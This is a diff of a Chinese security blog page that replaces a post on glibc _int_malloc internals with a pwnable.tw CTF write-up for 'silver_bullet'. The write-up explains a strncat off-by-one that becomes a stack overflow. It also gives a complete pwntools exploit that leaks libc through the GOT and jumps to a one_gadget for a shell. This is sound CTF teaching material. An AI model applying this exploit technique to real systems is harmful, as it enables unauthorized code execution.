@@ -7,11 +7,11 @@
 <head>
   <meta charset="utf-8" />
    
-  <meta name="keywords" content="CTF, pwn, heap, 堆漏洞,漏洞挖掘, 调试, 代码, 计算机科学, Kiprey, Blog, 二进制，信息安全" />
+  <meta name="keywords" content="CTF, pwn, pwnable.tw,漏洞挖掘, 调试, 代码, 计算机科学, Kiprey, Blog, 二进制，信息安全" />
    
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    heap - 4 - _int_malloc的相关操作 |  Kiprey&#39;s Blog
+    Pwnable.tw 部分题解-2 |  Kiprey&#39;s Blog
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -56,7 +56,7 @@ var _hmt = _hmt || [];
     <main class="content on">
       <section class="outer">
   <article
-  id="post-heap-4-_int_malloc_process"
+  id="post-pwnable-tw-2"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -67,7 +67,7 @@ var _hmt = _hmt || [];
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  heap - 4 - _int_malloc的相关操作
+  Pwnable.tw 部分题解-2
 </h1>
  
 
@@ -75,15 +75,15 @@ var _hmt = _hmt || [];
     </header>
      
     <div class="article-meta">
-      <a href="/2020/04/heap-4-_int_malloc_process/" class="article-date">
-  <time datetime="2020-04-03T16:00:00.000Z" itemprop="datePublished">2020-04-04</time>
+      <a href="/2021/09/pwnable-tw-2/" class="article-date">
+  <time datetime="2021-09-23T03:12:44.000Z" itemprop="datePublished">2021-09-23</time>
 </a>   
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">734</span>
+            <span class="post-count">770</span>
         </span>
     </span>
 
@@ -92,7 +92,7 @@ var _hmt = _hmt || [];
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">2 分钟</span>
+            <span class="post-count">3 分钟</span>
         </span>
     </span>
 </div>
@@ -107,82 +107,47 @@ var _hmt = _hmt || [];
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p>_int_malloc的一系列操作</p>
+  <h2 id="简介">简介</h2>
+<p>这里将保存部分做过的 <a href="http://pwnable.tw" target="_blank" rel="noopener">pwnable.tw</a> 的题解。</p>
 <a id="more"></a>
+<h2 id="一、silver-bullet">一、silver_bullet</h2>
+<h3 id="1-环境配置">1. 环境配置</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed ./libc_32.so.6 /home/Kiprey/Desktop/Pwn/libc_32.so.6 ./silver_bullet</span><br><span class="line">patchelf --<span class="built_in">set</span>-interpreter /mylibs/2.23-0ubuntu10_i386/ld-2.23.so ./silver_bullet</span><br></pre></td></tr></table></figure>
+<h3 id="2-查看保护">2. 查看保护</h3>
+<p><img src="/2021/09/pwnable-tw-2/image-20210909104505396.png" alt="image-20210909104505396"></p>
+<p>No canary &amp;&amp; No PIE.</p>
+<h3 id="3-运行流程">3. 运行流程</h3>
+<ul>
+<li>
+<p>在 <code>create_bullet</code> 函数中，程序会要求用户输入一串字符串，并放置长度至特定位置。</p>
+<p><img src="/2021/09/pwnable-tw-2/image-20210909135701700.png" alt="image-20210909135701700"></p>
 <blockquote>
-<p>注意！ 以下步骤若未明确标明退出函数，则表示在执行完当前操作后，继续执行剩余操作</p>
+<p>这里看汇编会比伪代码更清楚一点</p>
 </blockquote>
-<h2 id="1-判断arena是否为空">1. 判断arena是否为空</h2>
-<ul>
-<li>如果是，则调用sysmalloc分配所需内存，<strong>返回并退出</strong></li>
-</ul>
-<h2 id="2-判断所申请的chunk大小是否小于fast-chunk的最大值">2. 判断所申请的chunk大小是否小于fast chunk的最大值</h2>
-<ul>
-<li>如果是，则尝试取出fast bin里的第一个chunk(<code>fastbin-&gt;fd</code>)</li>
-<li>如果该chunk不为空，则检查该chunk是否出错、 <strong>返回该chunk用户地址并退出</strong></li>
-</ul>
-<h2 id="3-判断所申请的chunk大小是否小于small-chunk的最大值">3. 判断所申请的chunk大小是否小于small chunk的最大值</h2>
-<ul>
-<li>如果是，并且指向small bin最后一个chunk的指针（<code>smallbin-&gt;bk</code>）不指向small bin自己，则判断该指针是否为NULL
-<ul>
-<li>如果是，则说明此时是第一次执行该部分代码，则执行<code>malloc_consolidate</code>函数</li>
-<li>否则，则说明small bin上存在可用chunk，检查该chunk是否出错、将该chunk取出， <strong>返回该chunk用户地址并退出</strong></li>
-</ul>
+<p>可以看到，程序将读入的字符串放入 <code>char s[0x30]</code>的缓冲区中，并将其长度放至 <code>s[0x30]</code> 地址上。</p>
+</li>
+<li>
+<p>而在 <code>power_up</code> 函数中，程序会额外读入 <code>0x30-strlen(s)</code>的字符串，并拼接至原先的缓冲区字符串上。</p>
+<p><img src="/2021/09/pwnable-tw-2/image-20210909140110048.png" alt="image-20210909140110048"></p>
+<p>关键的漏洞点在于<code>strncat</code>这个函数的使用。通过查阅 Linux Manual Page，我们可以很容易的得到这样的一段话：</p>
+<blockquote>
+<p><strong>If src contains n or more bytes, strncat() writes n+1 bytes to dest</strong> (n from  src  plus  the  terminating  null byte).  Therefore, <strong>the size of dest must be at least strlen(dest)+n+1.</strong></p>
+</blockquote>
+<p>因此此处将会有一个 off-by-one 的漏洞，<strong>将存储字符串长度的内存位置覆盖为0</strong>，因此若下一次执行<code>power_up</code>函数时，由于长度被覆盖为0，因此仍然可以继续拼接字符串至原先的字符串上，而这就造成了<strong>栈溢出</strong>。</p>
+</li>
+<li>
+<p>对于栈溢出的利用，我们自然希望 main 函数可以正常 return，这样就可以利用被修改的 ret addr 来跳转至任意位置。但 main 函数若要正常 return，则需要让函数 <code>beat</code> 的返回值为1。</p>
+<p><img src="/2021/09/pwnable-tw-2/image-20210909151949446.png" alt="image-20210909151949446"></p>
+<p>其中，怪物的血量为 0x7fffffff，而子弹的攻击值为 存放在s[0x30]。我们可以在 <code>power_up</code>  栈溢出时，先将 s[0x30] 覆盖为一个超大值，这样经过一番执行，最终的 s[0x30] 就是一个超大值:</p>
+<p><img src="/2021/09/pwnable-tw-2/image-20210909152350997.png" alt="image-20210909152350997"></p>
+<p>这样最终我们便可以达到从 main 函数返回的目的。</p>
+</li>
+<li>
+<p>栈溢出利用，我们可以先泄露 GOT 上的函数地址，算出 libc 基地址，最后算出 system 函数以及 bin_sh 的地址，然后跳转回 main 函数，重新覆盖 ret addr 为 system，并执行 /bin/sh。或者用 one_gadget 一把梭也很酸爽。</p>
 </li>
 </ul>
-<h2 id="4-取出largebin的索引，并判断是否有空闲的fastchunk">4. 取出largebin的索引，并判断是否有空闲的fastchunk</h2>
-<ul>
-<li>如果有，则执行<code>malloc_consolidate</code>函数</li>
-</ul>
-<h2 id="5-进入大型循环——for循环">5. 进入大型循环——for循环</h2>
-<h3 id="1-遍历unsortedbin里的chunk最多10000次，并执行以下操作">1. 遍历unsortedbin里的chunk最多10000次，并执行以下操作</h3>
-<ol>
-<li>检测该chunk的大小是否非常小或非常大
-<ul>
-<li>如果是，输出错误信息并 <strong>退出</strong></li>
-</ul>
-</li>
-<li>判断用户申请的大小是否同时满足以下3个条件
-<ol>
-<li>在smallchunk的范围内</li>
-<li>unsorted bin里只有一个chunk</li>
-<li>并且该chunk是last_remainder</li>
-</ol>
-<ul>
-<li>如果是，则切割last_remainder,并将剩余remainder放回unsortedbin里、重设last_remainder、检查chunk，最后 <strong>返回该chunk的用户地址并退出</strong></li>
-</ul>
-</li>
-<li>如果这块chunk刚好与所申请的chunk大小相等，则取出该chunk、检查chunk、 <strong>返回该chunk的用户地址并退出</strong></li>
-<li>将遍历到的chunk根据大小放置进small bin或large bin里</li>
-</ol>
-<h3 id="2-尝试在large-bin里搜索可用的chunk">2. 尝试在large bin里搜索可用的chunk</h3>
-<ul>
-<li>如果large bin里，size最大的chunk，其size小于所申请的内存大小
-<ol>
-<li>取出large bin里，size最接近所申请chunk的chunk</li>
-<li>判断该chunk和所申请内存大小相差是否小于MINSIZE
-<ul>
-<li>如果是，则多出的这块内存一并附赠给用户</li>
-<li>否则，分割这块chunk，将剩余的chunk放入unsorted bin里、检查目标chunk、<strong>返回该chunk的用户地址并退出</strong></li>
-</ul>
-</li>
-</ol>
-</li>
-</ul>
-<h3 id="3-在其他free-chunks大小更大的bin里找更大的内存">3. 在其他free chunks大小更大的bin里找更大的内存</h3>
-<ul>
-<li>由于fastbin、smallbin、largebin上的freechunk是分组的，所以可能出现目标组别上的freechunk无法满足大小，此时使用binmap，去其他更大的bins里查找freechunk</li>
-</ul>
-<h3 id="4-如果执行到了这里，那就真是什么freechunk都找不到了，则判断top-chunk是否够用">4. 如果执行到了这里，那就真是什么freechunk都找不到了，则判断top chunk是否够用</h3>
-<ol>
-<li>如果够用，切割top chunk并使用</li>
-<li>否则，则判断是否有fast chunk空闲
-<ul>
-<li>如果有，则执行<code>malloc_consolidate</code>函数，然后 <strong>返回for循环起点，重新执行相关代码</strong></li>
-<li>否则，调用sysmalloc申请内存，<strong>返回该chunk的用户地址并退出</strong></li>
-</ul>
-</li>
-</ol>
+<h3 id="4-Exploit">4. Exploit</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ELFname = <span class="string">"./silver_bullet"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    io = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10103</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(ELFname)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">e = ELF(ELFname)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> msg, content : io.sendlineafter(msg, content)</span><br><span class="line">sl = <span class="keyword">lambda</span> content : io.sendline(content)</span><br><span class="line">rv = <span class="keyword">lambda</span> x=<span class="literal">None</span> : io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> msg : io.recvuntil(msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(msg = <span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(io, msg)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_bullet</span><span class="params">(bullet)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"Give me your description of bullet :"</span>, bullet)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">power_up</span><span class="params">(bullet)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    sla(<span class="string">"Give me your another description of bullet :"</span>, bullet)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">beat</span><span class="params">()</span>:</span></span><br><span class="line">    sla(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line">one_gadget_offset = <span class="number">0x5f065</span> <span class="comment"># 1. esi is the GOT address of libc; 2. eax == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">buffoverflow</span><span class="params">(data)</span>:</span></span><br><span class="line">        create_bullet(<span class="string">"a"</span>*<span class="number">0x20</span>)</span><br><span class="line">        power_up(<span class="string">"a"</span>*<span class="number">0x10</span>)</span><br><span class="line">        power_up(<span class="string">"\xff\xff\x7f"</span> + <span class="string">"a"</span>*<span class="number">4</span> + data)</span><br><span class="line">        beat()</span><br><span class="line">        beat()</span><br><span class="line">    </span><br><span class="line">    buffoverflow(flat(p32(e.plt[<span class="string">"printf"</span>]), </span><br><span class="line">                      p32(e.symbols[<span class="string">'main'</span>]), </span><br><span class="line">                      p32(e.got[<span class="string">"puts"</span>])))</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">"Oh ! You win !!\n"</span>)</span><br><span class="line">    debug()</span><br><span class="line">    puts_got = u32(rv(<span class="number">4</span>))</span><br><span class="line">    log.info(<span class="string">"puts got addr: "</span> + hex(puts_got))</span><br><span class="line"></span><br><span class="line">    libc_base = puts_got - libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">    log.info(<span class="string">"libc base addr: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">    one_gadget_addr = libc_base + one_gadget_offset</span><br><span class="line">    log.info(<span class="string">"one_gadget addr: "</span> + hex(one_gadget_addr))</span><br><span class="line"></span><br><span class="line">    buffoverflow(p32(one_gadget_addr))</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
  
       <!-- reward -->
       
@@ -247,12 +212,12 @@ var _hmt = _hmt || [];
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kiprey.github.io/2020/04/heap-4-_int_malloc_process/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kiprey.github.io/2021/09/pwnable-tw-2/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Heap/" rel="tag">Heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable-tw/" rel="tag">pwnable.tw</a></li></ul>
 
     </footer>
   </div>
@@ -260,19 +225,10 @@ var _hmt = _hmt || [];
    
   <nav class="article-nav">
     
-      <a href="/2020/04/heap-5-heap_definitions/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            heap - 5 - malloc、free函数相关的宏定义
-          
-        </div>
-      </a>
     
-    
-      <a href="/2020/04/heap-3-bins/" class="article-nav-link">
+      <a href="/2021/05/cnatda-1/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">heap - 3 - bins分类</div>
+        <div class="article-nav-title">计算机网络笔记-1</div>
       </a>
     
   </nav>
